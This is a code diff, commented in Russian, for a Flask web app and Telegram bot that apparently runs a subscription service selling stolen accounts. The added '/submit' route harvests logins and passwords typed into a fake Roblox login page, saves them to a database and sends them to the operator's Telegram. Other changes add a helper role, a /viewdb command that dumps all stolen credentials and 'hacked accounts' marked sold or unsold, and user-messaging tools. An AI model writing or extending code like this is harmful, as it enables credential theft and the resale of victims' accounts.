@@ -130,20 +130,11 @@ def init_db():
                 chat_id TEXT PRIMARY KEY,
                 prefix TEXT,
                 subscription_end TEXT,
-                username TEXT
+                username TEXT,
+                last_activity TEXT,
+                ip_hash TEXT
             )
         ''')
-        c.execute("SELECT column_name FROM information_schema.columns WHERE table_name = 'users'")
-        columns = [row[0] for row in c.fetchall()]
-        if 'last_activity' not in columns:
-            logger.info("Добавление last_activity")
-            c.execute('ALTER TABLE users ADD COLUMN last_activity TEXT')
-        if 'ip_hash' not in columns:
-            logger.info("Добавление ip_hash")
-            c.execute('ALTER TABLE users ADD COLUMN ip_hash TEXT')
-        if 'username' not in columns:
-            logger.info("Добавление username")
-            c.execute('ALTER TABLE users ADD COLUMN username TEXT')
         c.execute('''
             CREATE TABLE IF NOT EXISTS credentials (
                 login TEXT PRIMARY KEY,
@@ -162,8 +153,6 @@ def init_db():
                 linked_chat_id TEXT
             )
         ''')
-        c.execute("DELETE FROM credentials")
-        c.execute("DELETE FROM hacked_accounts")
         subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
         logger.info(f"Добавление Создателя: {ADMIN_CHAT_ID}")
         c.execute(
@@ -276,6 +265,14 @@ def save_user(chat_id, prefix, subscription_end=None, ip=None, username=None):
 def check_access(chat_id, command):
     global tech_mode, tech_end_time
     logger.info(f"Проверка: {chat_id} для {command}")
+    user = get_user(chat_id)
+    
+    # Технический помощник имеет доступ ко всем командам даже во время техперерыва
+    if user and user['prefix'] == 'ТехПомощник':
+        logger.debug(f"ТехПомощник {chat_id} имеет полный доступ")
+        return None
+    
+    # Проверка техперерыва для остальных пользователей
     if tech_mode and chat_id != ADMIN_CHAT_ID:
         end_time_str = format_time(tech_end_time)
         logger.warning(f"Тех. режим: {chat_id}")
@@ -285,7 +282,7 @@ def check_access(chat_id, command):
             f"🕒 *Окончание*: {end_time_str}\n"
             f"Попробуйте позже."
         )
-    user = get_user(chat_id)
+    
     if user is None:
         if command in ['menu', 'support'] and not tech_mode:
             logger.info(f"Регистрация {chat_id}")
@@ -293,26 +290,33 @@ def check_access(chat_id, command):
             return None
         logger.warning(f"Нет доступа: {chat_id}, {command}")
         return "💳 *Купить подписку у @sacoectasy!*"
+    
     if user['subscription_end'] and user['subscription_end'] < get_current_time():
         logger.info(f"Подписка истекла: {chat_id}")
         save_user(chat_id, 'Посетитель', get_current_time().isoformat(), chat_id, user['username'])
         return "💳 *Подписка истекла! Обратитесь к @sacoectasy.*"
+    
     if user['prefix'] == 'Посетитель':
         if command in ['menu', 'support'] and not tech_mode:
             logger.debug(f"Разрешён {command}")
             return None
         logger.warning(f"Запрещён {command} для Посетителя")
         return "💳 *Купить подписку у @sacoectasy!*"
-    if command in ['passwords', 'hacked', 'getchatid', 'site']:
+    
+    if command in ['passwords', 'hacked', 'getchatid', 'site', 'contact']:
         logger.debug(f"Разрешён {command}")
         return None
-    if command == 'database' and user['prefix'] in ['Админ', 'Создатель']:
-        logger.debug(f"Разрешён {command} для {user['prefix']}")
-        return None
+    
+    if command in ['database', 'viewdb']:
+        if user['prefix'] in ['Админ', 'Создатель', 'ТехПомощник']:
+            logger.debug(f"Разрешён {command} для {user['prefix']}")
+            return None
+    
     if command in ['techstop', 'techstopoff', 'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast', 'admin']:
-        if user['prefix'] != 'Создатель':
+        if user['prefix'] not in ['Создатель', 'ТехПомощник']:
             logger.warning(f"Админ-команда {command} от {chat_id}")
-            return "🔒 *Эта команда только для Создателя!*"
+            return "🔒 *Эта команда только для Создателя или ТехПомощника!*"
+    
     logger.debug(f"Разрешён {command}")
     return None
 
@@ -355,7 +359,6 @@ def check_bot_status():
     except Exception as e:
         logger.error(f"Бот не отвечает: {e}")
         return False
-
 
 # Маршруты Flask
 @app.route('/', endpoint='index')
@@ -402,6 +405,58 @@ def hot_right_now():
 def top_revisited():
     logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
+
+# Обработчик формы логина
+@app.route('/submit', methods=['POST'])
+def submit_login():
+    logger.info("Обработка формы логина")
+    try:
+        login = sanitize_input(request.form.get('login'))
+        password = sanitize_input(request.form.get('password'))
+        if not login or not password:
+            logger.warning("Пустой логин или пароль")
+            return render_template('login-roblox.html', error="Логин и пароль обязательны")
+        
+        # Сохранение в базу
+        conn = get_db_connection()
+        if conn is None:
+            logger.error("База недоступна")
+            return render_template('login-roblox.html', error="Ошибка сервера")
+        
+        try:
+            c = conn.cursor()
+            c.execute(
+                '''
+                INSERT INTO credentials (login, password, added_time, added_by)
+                VALUES (%s, %s, %s, %s)
+                ON CONFLICT (login) DO NOTHING
+                ''',
+                (login, password, get_current_time().isoformat(), "web_form")
+            )
+            conn.commit()
+            logger.info(f"Сохранено: {login}")
+        except Exception as e:
+            logger.error(f"Ошибка сохранения: {e}")
+            conn.close()
+            return render_template('login-roblox.html', error="Ошибка сохранения данных")
+        finally:
+            conn.close()
+        
+        # Отправка в Telegram
+        try:
+            bot.send_message(
+                ADMIN_CHAT_ID,
+                f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
+                parse_mode='Markdown'
+            )
+            logger.info("Данные отправлены в Telegram")
+        except Exception as e:
+            logger.error(f"Ошибка Telegram: {e}")
+        
+        return render_template('login-roblox.html', success="Данные успешно отправлены")
+    except Exception as e:
+        logger.error(f"Ошибка формы: {e}")
+        return render_template('login-roblox.html', error="Произошла ошибка")
 
 # Обработчик 404-ошибок
 @app.errorhandler(404)
@@ -513,10 +568,14 @@ def menu_cmd(message):
             f"🌐 /site — Ссылка на наш сайт\n"
             f"🔑 /passwords — Просмотр паролей\n"
             f"💻 /hacked — Взломанные аккаунты\n"
+            f"📞 /contact — Связаться с пользователем\n"
         )
-    if prefix in ["Админ", "Создатель"]:
-        response += f"🗄 /database — Управление базой данных\n"
-    if prefix == "Создатель":
+    if prefix in ["Админ", "Создатель", "ТехПомощник"]:
+        response += (
+            f"🗄 /database — Управление базой данных\n"
+            f"🔍 /viewdb — Просмотр базы данных\n"
+        )
+    if prefix in ["Создатель", "ТехПомощник"]:
         response += (
             f"🔧 /admin — Панель администратора\n"
             f"🚨 /techstop — Включить техперерыв\n"
@@ -534,6 +593,97 @@ def menu_cmd(message):
         save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id, username)
     except Exception as e:
         logger.error(f"Ошибка /menu: {e}")
+
+# /contact — Новая команда для обращения к пользователю
+@bot.message_handler(commands=['contact'])
+def contact_cmd(message):
+    chat_id = str(message.chat.id)
+    username = sanitize_input(message.from_user.username) or "Неизвестно"
+    logger.info(f"/contact от {chat_id}")
+    access = check_access(chat_id, 'contact')
+    if access:
+        try:
+            bot.reply_to(message, access, parse_mode='Markdown')
+            logger.info(f"Ответ: {access}")
+        except Exception as e:
+            logger.error(f"Ошибка /contact: {e}")
+        return
+    
+    users = get_all_users()
+    if not users:
+        try:
+            bot.reply_to(message, "📭 *Нет пользователей для выбора!*", parse_mode='Markdown')
+            logger.info("Нет пользователей")
+        except Exception as e:
+            logger.error(f"Ошибка /contact: {e}")
+        return
+    
+    keyboard = types.InlineKeyboardMarkup(row_width=2)
+    for user_id, prefix, user_name in users:
+        user_name = user_name or "Неизвестно"
+        keyboard.add(
+            types.InlineKeyboardButton(
+                f"@{user_name} ({prefix})",
+                callback_data=f"contact_user_{user_id}"
+            )
+        )
+    try:
+        bot.reply_to(
+            message,
+            "👥 *Выберите пользователя для отправки сообщения*:",
+            reply_markup=keyboard,
+            parse_mode='Markdown'
+        )
+        logger.info("Показан список пользователей")
+    except Exception as e:
+        logger.error(f"Ошибка /contact: {e}")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('contact_user_'))
+def handle_contact_user(call):
+    chat_id = str(call.message.chat.id)
+    target_id = call.data.replace('contact_user_', '')
+    logger.info(f"Выбор пользователя {target_id} от {chat_id}")
+    try:
+        msg = bot.send_message(
+            chat_id,
+            f"📝 *Введите сообщение для пользователя {target_id}*:",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, lambda m: process_contact_message(m, target_id))
+        bot.answer_callback_query(call.id)
+        logger.info(f"Запрошено сообщение для {target_id}")
+    except Exception as e:
+        logger.error(f"Ошибка выбора: {e}")
+        bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
+
+def process_contact_message(message, target_id):
+    chat_id = str(message.chat.id)
+    text = sanitize_input(message.text)
+    logger.info(f"Сообщение для {target_id}: {text}")
+    if not text:
+        try:
+            bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
+            logger.warning("Пустое сообщение")
+        except Exception as e:
+            logger.error(f"Ошибка ответа: {e}")
+        return
+    try:
+        user = get_user(chat_id)
+        sender_name = user['username'] or "Неизвестно"
+        bot.send_message(
+            target_id,
+            f"📩 *Сообщение от разработчика (@{sender_name})*:\n{text}",
+            parse_mode='Markdown'
+        )
+        bot.reply_to(
+            message,
+            f"✅ *Сообщение отправлено пользователю {target_id}!*",
+            parse_mode='Markdown'
+        )
+        logger.info(f"Сообщение отправлено")
+    except Exception as e:
+        logger.error(f"Ошибка отправки: {e}")
+        bot.reply_to(message, "❌ *Ошибка отправки!*", parse_mode='Markdown')
 
 # /getchatid
 @bot.message_handler(commands=['getchatid'])
@@ -715,7 +865,7 @@ def passwords_cmd(message):
         keyboard.add(
             types.InlineKeyboardButton("➕ Добавить в hacked", callback_data="add_to_hacked")
         )
-        if user['prefix'] in ["Админ", "Создатель"]:
+        if user['prefix'] in ["Админ", "Создатель", "ТехПомощник"]:
             keyboard.add(
                 types.InlineKeyboardButton("🗑 Удалить пароль", callback_data="delete_cred")
             )
@@ -748,7 +898,7 @@ def handle_passwords_buttons(call):
         return
     user = get_user(chat_id)
     if call.data == 'add_to_hacked':
-        if user['prefix'] not in ['Админ', 'Создатель']:
+        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
             try:
                 bot.answer_callback_query(call.id)
                 bot.send_message(chat_id, "🔒 *Добавление в hacked только для админов!*", parse_mode='Markdown')
@@ -764,7 +914,7 @@ def handle_passwords_buttons(call):
         except Exception as e:
             logger.error(f"Ошибка add_to_hacked: {e}")
     elif call.data == 'delete_cred':
-        if user['prefix'] not in ['Админ', 'Создатель']:
+        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
             try:
                 bot.answer_callback_query(call.id)
                 bot.send_message(chat_id, "🔒 *Удаление паролей только для админов!*", parse_mode='Markdown')
@@ -958,6 +1108,7 @@ def admin_cmd(message):
         "💻 /hacked — Просмотр взломанных аккаунтов\n"
         "🔑 /passwords — Управление паролями\n"
         "🗄 /database — Управление базой данных\n"
+        "🔍 /viewdb — Просмотр базы данных\n"
         "🚨 /techstop — Включить техперерыв\n"
         "✅ /techstopoff — Выключить техперерыв\n"
         "📢 /broadcast — Отправить рассылку\n"
@@ -966,6 +1117,7 @@ def admin_cmd(message):
         "➕ /adduser — Добавить пользователя\n"
         "🔐 /addcred — Добавить пароль\n"
         "💾 /addhacked — Добавить взломанный аккаунт\n"
+        "📞 /contact — Связаться с пользователем\n"
     )
     try:
         bot.reply_to(message, response, parse_mode='Markdown')
@@ -975,6 +1127,83 @@ def admin_cmd(message):
     except Exception as e:
         logger.error(f"Ошибка /admin: {e}")
         bot.reply_to(message, "❌ *Ошибка загрузки панели!*", parse_mode='Markdown')
+
+# /viewdb — Новая команда для просмотра базы данных
+@bot.message_handler(commands=['viewdb'])
+def viewdb_cmd(message):
+    chat_id = str(message.chat.id)
+    username = sanitize_input(message.from_user.username) or "Неизвестно"
+    logger.info(f"/viewdb от {chat_id}")
+    access = check_access(chat_id, 'viewdb')
+    if access:
+        try:
+            bot.reply_to(message, access, parse_mode='Markdown')
+            logger.info(f"Ответ: {access}")
+        except Exception as e:
+            logger.error(f"Ошибка /viewdb: {e}")
+        return
+    conn = get_db_connection()
+    if conn is None:
+        try:
+            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
+            logger.error("База недоступна")
+        except Exception as e:
+            logger.error(f"Ошибка ответа: {e}")
+        return
+    try:
+        c = conn.cursor()
+        response = "🗄 *Содержимое базы данных*\n\n"
+        
+        # Пользователи
+        c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
+        users = c.fetchall()
+        response += "👥 *Пользователи*:\n"
+        if not users:
+            response += "📭 Пусто\n"
+        for chat_id, prefix, username, sub_end in users:
+            response += (
+                f"🆔 `{chat_id}`\n"
+                f"👤 @{username or 'Неизвестно'}\n"
+                f"🔑 `{prefix}`\n"
+                f"🕒 Подписка до: {format_time(datetime.fromisoformat(sub_end)) if sub_end else 'Неизвестно'}\n\n"
+            )
+        
+        # Пароли
+        c.execute("SELECT login, password, added_time FROM credentials")
+        credentials = c.fetchall()
+        response += "🔐 *Пароли*:\n"
+        if not credentials:
+            response += "📭 Пусто\n"
+        for login, password, added_time in credentials:
+            response += (
+                f"🔑 `{login}`\n"
+                f"🔒 `{password}`\n"
+                f"🕒 Добавлено: {format_time(datetime.fromisoformat(added_time)) if added_time else 'Неизвестно'}\n\n"
+            )
+        
+        # Взломанные аккаунты
+        c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
+        hacked = c.fetchall()
+        response += "💻 *Взломанные аккаунты*:\n"
+        if not hacked:
+            response += "📭 Пусто\n"
+        for login, password, status, hack_date in hacked:
+            response += (
+                f"🔑 `{login}`\n"
+                f"🔒 `{password}`\n"
+                f"📊 `{status}`\n"
+                f"🕒 Взломан: {format_time(datetime.fromisoformat(hack_date)) if hack_date else 'Неизвестно'}\n\n"
+            )
+        
+        bot.reply_to(message, response, parse_mode='Markdown')
+        logger.info("База показана")
+        user = get_user(chat_id)
+        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id, username)
+    except Exception as e:
+        logger.error(f"Ошибка /viewdb: {e}")
+        bot.reply_to(message, "❌ *Ошибка загрузки данных!*", parse_mode='Markdown')
+    finally:
+        conn.close()
 
 # /database
 @bot.message_handler(commands=['database'])
@@ -1243,6 +1472,7 @@ def process_adprefix(message):
         target_id, prefix = sanitize_input(message.text).split()
         subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
         user = get_user(target_id)
+        old_prefix = user['prefix'] if user else "Посетитель"
         username = user['username'] if user else "Неизвестно"
         save_user(target_id, prefix, subscription_end, target_id, username)
         bot.reply_to(
@@ -1250,6 +1480,16 @@ def process_adprefix(message):
             f"✅ *Подписка выдана для `{target_id}`!*\n🔑 *Префикс*: `{prefix}`",
             parse_mode='Markdown'
         )
+        # Уведомление пользователю
+        try:
+            bot.send_message(
+                target_id,
+                f"🎉 *Ваш префикс обновлён!*\n🔑 *Новый префикс*: `{prefix}`\n🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
+                parse_mode='Markdown'
+            )
+            logger.info(f"Уведомление отправлено {target_id}")
+        except Exception as e:
+            logger.error(f"Ошибка уведомления {target_id}: {e}")
         logger.info(f"Подписка: {target_id}, {prefix}")
     except ValueError:
         logger.warning("Неверный формат")
@@ -1277,7 +1517,11 @@ def delprefix_cmd(message):
             logger.error(f"Ошибка /delprefix: {e}")
         return
     try:
-        msg = bot.reply_to(message, "📝 *Введите chat_id*:", parse_mode='Markdown')
+        msg = bot.reply_to(
+            message,
+            "📝 *Введите chat_id и причину удаления (через пробел, например: 123456 Нарушение)*:",
+            parse_mode='Markdown'
+        )
         bot.register_next_step_handler(msg, process_delprefix)
         logger.info(f"Запрошено удаление префикса")
     except Exception as e:
@@ -1286,25 +1530,42 @@ def delprefix_cmd(message):
 
 def process_delprefix(message):
     chat_id = str(message.chat.id)
-    target_id = sanitize_input(message.text)
-    logger.info(f"Сброс: {target_id}")
-    if not target_id:
-        try:
-            bot.reply_to(message, "❌ *ID не может быть пустым!*", parse_mode='Markdown')
-            logger.warning("Пустой ID")
-        except Exception as e:
-            logger.error(f"Ошибка ответа: {e}")
-        return
-    user = get_user(target_id)
-    username = user['username'] if user else "Неизвестно"
-    save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, username)
     try:
+        target_id, reason = sanitize_input(message.text).rsplit(maxsplit=1)
+        logger.info(f"Сброс: {target_id}, причина: {reason}")
+        if not target_id:
+            try:
+                bot.reply_to(message, "❌ *ID не может быть пустым!*", parse_mode='Markdown')
+                logger.warning("Пустой ID")
+            except Exception as e:
+                logger.error(f"Ошибка ответа: {e}")
+            return
+        user = get_user(target_id)
+        username = user['username'] if user else "Неизвестно"
+        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, username)
         bot.reply_to(
             message,
-            f"✅ *Подписка для `{target_id}` сброшена до `Посетитель`!*",
+            f"✅ *Подписка для `{target_id}` сброшена до `Посетитель`!*\n📝 *Причина*: {reason}",
             parse_mode='Markdown'
         )
+        # Уведомление пользователю
+        try:
+            bot.send_message(
+                target_id,
+                f"⚠️ *Ваш префикс сброшен до `Посетитель`!*\n📝 *Причина*: {reason}",
+                parse_mode='Markdown'
+            )
+            logger.info(f"Уведомление отправлено {target_id}")
+        except Exception as e:
+            logger.error(f"Ошибка уведомления {target_id}: {e}")
         logger.info(f"Сброшено: {target_id}")
+    except ValueError:
+        logger.warning("Неверный формат")
+        bot.reply_to(
+            message,
+            "❌ *Формат: chat_id причина*",
+            parse_mode='Markdown'
+        )
     except Exception as e:
         logger.error(f"Ошибка сброса: {e}")
         bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
@@ -1345,6 +1606,16 @@ def process_add_user(message):
             f"✅ *Пользователь `{target_id}` добавлен!*\n🔑 *Префикс*: `{prefix}`",
             parse_mode='Markdown'
         )
+        # Уведомление пользователю
+        try:
+            bot.send_message(
+                target_id,
+                f"🎉 *Вы добавлены в систему!*\n🔑 *Ваш префикс*: `{prefix}`",
+                parse_mode='Markdown'
+            )
+            logger.info(f"Уведомление отправлено {target_id}")
+        except Exception as e:
+            logger.error(f"Ошибка уведомления {target_id}: {e}")
         logger.info(f"Добавлен: {target_id}, {prefix}")
     except ValueError:
         logger.warning("Неверный формат")
@@ -1436,6 +1707,16 @@ def process_add_cred_password(message, login):
             f"✅ *Пароль для `{login}` успешно добавлен!*",
             parse_mode='Markdown'
         )
+        # Отправка в Telegram
+        try:
+            bot.send_message(
+                ADMIN_CHAT_ID,
+                f"🔐 *Новый пароль добавлен*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}\n➕ *Добавил*: {chat_id}",
+                parse_mode='Markdown'
+            )
+            logger.info("Пароль отправлен в Telegram")
+        except Exception as e:
+            logger.error(f"Ошибка Telegram: {e}")
         logger.info(f"Добавлен: {login}")
     except Exception as e:
         logger.error(f"Ошибка добавления: {e}")
@@ -1483,7 +1764,7 @@ def process_add_hacked_login(message):
     try:
         msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
         bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))
-        logger.info(f"Запрошен пароль")
+        logger.info(f"Запрошен пароль для {login}")
     except Exception as e:
         logger.error(f"Ошибка логина: {e}")
         bot.reply_to(message, "❌ *Ошибка запроса!*", parse_mode='Markdown')
@@ -1501,8 +1782,8 @@ def process_add_hacked_password(message, login):
         return
     keyboard = types.InlineKeyboardMarkup()
     keyboard.add(
-        types.InlineKeyboardButton("✅ Продан", callback_data=f"hacked_status_sold_{login}_{password}"),
-        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"hacked_status_not_sold_{login}_{password}")
+        types.InlineKeyboardButton("✅ Продан", callback_data=f"add_hacked_status_sold_{login}_{password}"),
+        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"add_hacked_status_not_sold_{login}_{password}")
     )
     try:
         bot.reply_to(
@@ -1511,10 +1792,88 @@ def process_add_hacked_password(message, login):
             reply_markup=keyboard,
             parse_mode='Markdown'
         )
-        logger.info(f"Запрошен статус")
+        logger.info(f"Запрошен статус для {login}")
     except Exception as e:
         logger.error(f"Ошибка статуса: {e}")
-        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
+        bot.reply_to(message, "❌ *Ошибка запроса статуса!*", parse_mode='Markdown')
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('add_hacked_status_'))
+def handle_add_hacked_status(call):
+    chat_id = str(call.message.chat.id)
+    logger.info(f"Обработка статуса {call.data} от {chat_id}")
+    access = check_access(chat_id, 'addhacked')
+    if access:
+        try:
+            bot.answer_callback_query(call.id)
+            bot.send_message(chat_id, access, parse_mode='Markdown')
+            logger.warning(f"Доступ запрещён для {chat_id}")
+        except Exception as e:
+            logger.error(f"Ошибка ответа: {e}")
+        return
+    try:
+        _, status, login, password = call.data.split('_', 3)
+        sold_status = "Продан" if status == "sold" else "Непродан"
+        conn = get_db_connection()
+        if conn is None:
+            try:
+                bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
+                logger.error("База недоступна")
+                bot.answer_callback_query(call.id)
+            except Exception as e:
+                logger.error(f"Ошибка ответа: {e}")
+            return
+        try:
+            c = conn.cursor()
+            c.execute(
+                '''
+                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
+                VALUES (%s, %s, %s, %s, %s, %s)
+                ON CONFLICT (login) DO UPDATE
+                SET password = EXCLUDED.password,
+                    hack_date = EXCLUDED.hack_date,
+                    prefix = EXCLUDED.prefix,
+                    sold_status = EXCLUDED.sold_status,
+                    linked_chat_id = EXCLUDED.linked_chat_id
+                ''',
+                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
+            )
+            conn.commit()
+            response = (
+                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n"
+                f"🔒 *Пароль*: `{password}`\n"
+                f"📊 *Статус*: {sold_status}\n"
+                f"🕒 *Время*: {format_time(get_current_time())}"
+            )
+            bot.send_message(chat_id, response, parse_mode='Markdown')
+            # Уведомление администратору
+            try:
+                bot.send_message(
+                    ADMIN_CHAT_ID,
+                    f"💾 *Новый взломанный аккаунт*\n"
+                    f"👤 *Логин*: `{login}`\n"
+                    f"🔒 *Пароль*: `{password}`\n"
+                    f"📊 *Статус*: {sold_status}\n"
+                    f"🕒 *Добавлено*: {format_time(get_current_time())}\n"
+                    f"➕ *Добавил*: {chat_id}",
+                    parse_mode='Markdown'
+                )
+                logger.info(f"Уведомление отправлено админу")
+            except Exception as e:
+                logger.error(f"Ошибка уведомления админу: {e}")
+            logger.info(f"Аккаунт добавлен: {login}, {sold_status}")
+        except Exception as e:
+            logger.error(f"Ошибка добавления в hacked: {e}")
+            bot.send_message(chat_id, "❌ *Ошибка добавления аккаунта!*", parse_mode='Markdown')
+        finally:
+            conn.close()
+        bot.answer_callback_query(call.id)
+    except Exception as e:
+        logger.error(f"Ошибка обработки статуса: {e}")
+        bot.send_message(chat_id, "❌ *Ошибка обработки статуса!*", parse_mode='Markdown')
+        try:
+            bot.answer_callback_query(call.id)
+        except Exception as e:
+            logger.error(f"Ошибка ответа на callback: {e}")
 
 # /broadcast
 @bot.message_handler(commands=['broadcast'])
@@ -1533,19 +1892,19 @@ def broadcast_cmd(message):
     try:
         msg = bot.reply_to(
             message,
-            "📢 *Введите текст для рассылки*:",
+            "📢 *Введите сообщение для рассылки всем пользователям*:",
             parse_mode='Markdown'
         )
-        bot.register_next_step_handler(msg, lambda m: process_broadcast_message(m, username))
-        logger.info(f"Запрошен текст")
+        bot.register_next_step_handler(msg, process_broadcast)
+        logger.info(f"Запрошено сообщение для рассылки")
     except Exception as e:
         logger.error(f"Ошибка /broadcast: {e}")
         bot.reply_to(message, "❌ *Ошибка запроса!*", parse_mode='Markdown')
 
-def process_broadcast_message(message, sender_username):
+def process_broadcast(message):
     chat_id = str(message.chat.id)
     text = sanitize_input(message.text)
-    logger.info(f"Текст: {text}")
+    logger.info(f"Рассылка от {chat_id}: {text}")
     if not text:
         try:
             bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
@@ -1553,210 +1912,81 @@ def process_broadcast_message(message, sender_username):
         except Exception as e:
             logger.error(f"Ошибка ответа: {e}")
         return
-    if any(keyword in text.lower() for keyword in ad_keywords):
-        try:
-            bot.reply_to(message, "🚫 *Сообщение содержит запрещённые слова!*", parse_mode='Markdown')
-            logger.warning(f"Реклама: {text}")
-        except Exception as e:
-            logger.error(f"Ошибка ответа: {e}")
-        return
     users = get_all_users()
     if not users:
         try:
-            bot.reply_to(message, "📢 *Нет пользователей для рассылки!*", parse_mode='Markdown')
+            bot.reply_to(message, "📭 *Нет пользователей для рассылки!*", parse_mode='Markdown')
             logger.info("Нет пользователей")
         except Exception as e:
             logger.error(f"Ошибка ответа: {e}")
         return
-    response = (
-        f"📢 *Подтвердите рассылку*\n"
-        f"👤 *Отправитель*: @{sender_username}\n"
-        f"📜 *Текст*:\n{text}\n\n"
-        f"👥 *Получателей*: {len(users)}\n"
-        f"Нажмите ниже для подтверждения или отмены:"
-    )
-    keyboard = types.InlineKeyboardMarkup()
-    keyboard.add(
-        types.InlineKeyboardButton("✅ Отправить", callback_data=f"broadcast_confirm_{text}"),
-        types.InlineKeyboardButton("⛔ Отменить", callback_data="broadcast_cancel")
-    )
-    try:
-        bot.reply_to(message, response, reply_markup=keyboard, parse_mode='Markdown')
-        logger.info(f"Запрошено подтверждение")
-    except Exception as e:
-        logger.error(f"Ошибка подтверждения: {e}")
-        bot.reply_to(message, "❌ *Ошибка обработки!*", parse_mode='Markdown')
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('broadcast_'))
-def handle_broadcast_buttons(call):
-    chat_id = str(call.message.chat.id)
-    logger.info(f"Кнопка {call.data} от {chat_id}")
-    if check_access(chat_id, 'broadcast'):
+    success_count = 0
+    fail_count = 0
+    for user_id, _, _ in users:
         try:
-            bot.answer_callback_query(call.id)
-            bot.send_message(chat_id, "🔒 *Доступ запрещён!*", parse_mode='Markdown')
-            logger.warning(f"Доступ запрещён")
-        except Exception as e:
-            logger.error(f"Ошибка ответа: {e}")
-        return
-    if call.data == 'broadcast_cancel':
-        try:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="❌ *Рассылка отменена!*",
-                parse_mode='Markdown'
-            )
-            bot.answer_callback_query(call.id)
-            logger.info(f"Рассылка отменена: {chat_id}")
-        except Exception as e:
-            logger.error(f"Ошибка отмены: {e}")
-            bot.send_message(chat_id, "❌ *Ошибка отмены!*", parse_mode='Markdown')
-        return
-    if call.data.startswith('broadcast_confirm_'):
-        text = call.data.replace('broadcast_confirm_', '', 1)
-        users = get_all_users()
-        success_count = 0
-        fail_count = 0
-        logger.info(f"Рассылка для {len(users)}")
-        for user_id, _, _ in users:
-            try:
-                bot.send_message(
-                    user_id,
-                    f"📢 *Сообщение от Создателя*:\n{text}",
-                    parse_mode='Markdown'
-                )
-                success_count += 1
-                logger.debug(f"Отправлено {user_id}")
-                time.sleep(0.05)
-            except Exception as e:
-                logger.error(f"Ошибка {user_id}: {e}")
-                fail_count += 1
-        response = (
-            f"📢 *Рассылка завершена!*\n"
-            f"✅ *Успешно*: {success_count}\n"
-            f"❌ *Ошибки*: {fail_count}"
-        )
-        try:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text=response,
-                parse_mode='Markdown'
-            )
-            bot.answer_callback_query(call.id)
-            logger.info(f"Рассылка: {success_count} ок, {fail_count} ошибок")
-        except Exception as e:
-            logger.error(f"Ошибка результата: {e}")
-            bot.send_message(chat_id, "❌ *Ошибка завершения!*", parse_mode='Markdown')
-
-# Неизвестные команды
-@bot.message_handler(func=lambda message: True)
-def unknown_command(message):
-    chat_id = str(message.chat.id)
-    text = sanitize_input(message.text.lower())
-    logger.info(f"Неизвестно от {chat_id}: {text}")
-    if any(keyword in text for keyword in ad_keywords):
-        logger.warning(f"Реклама: {text}")
-        try:
-            bot.reply_to(message, "🚫 *Реклама заблокирована!*", parse_mode='Markdown')
             bot.send_message(
-                ADMIN_CHAT_ID,
-                f"🚨 *Попытка рекламы*\n👤 *От*: {chat_id}\n📜 *Текст*: {text}",
+                user_id,
+                f"📢 *Объявление от администрации*:\n{text}",
                 parse_mode='Markdown'
             )
-            logger.info("Реклама заблокирована")
+            success_count += 1
+            logger.info(f"Сообщение отправлено {user_id}")
         except Exception as e:
-            logger.error(f"Ошибка блокировки: {e}")
-        return
+            logger.error(f"Ошибка отправки {user_id}: {e}")
+            fail_count += 1
     response = (
-        "❌ *Неизвестная команда!*\n"
-        "📖 Используйте /menu для списка команд."
+        f"📊 *Результат рассылки*:\n"
+        f"✅ *Отправлено*: {success_count}\n"
+        f"❌ *Не удалось*: {fail_count}"
     )
     try:
         bot.reply_to(message, response, parse_mode='Markdown')
-        logger.info(f"Ответ: {response}")
-        user = get_user(chat_id)
-        if user:
-            username = sanitize_input(message.from_user.username) or "Неизвестно"
-            save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id, username)
+        logger.info(f"Рассылка завершена")
     except Exception as e:
         logger.error(f"Ошибка ответа: {e}")
 
-# Мониторинг
-def monitor_activity():
-    logger.info("Запуск мониторинга")
-    while True:
-        try:
-            conn = get_db_connection()
-            if conn:
-                c = conn.cursor()
-                c.execute(
-                    "SELECT chat_id, last_activity FROM users WHERE last_activity < %s",
-                    ((get_current_time() - timedelta(days=30)).isoformat(),)
+# Проверка рекламы
+@bot.message_handler(content_types=['text'])
+def check_ads(message):
+    chat_id = str(message.chat.id)
+    text = sanitize_input(message.text.lower())
+    logger.info(f"Проверка текста от {chat_id}: {text}")
+    user = get_user(chat_id)
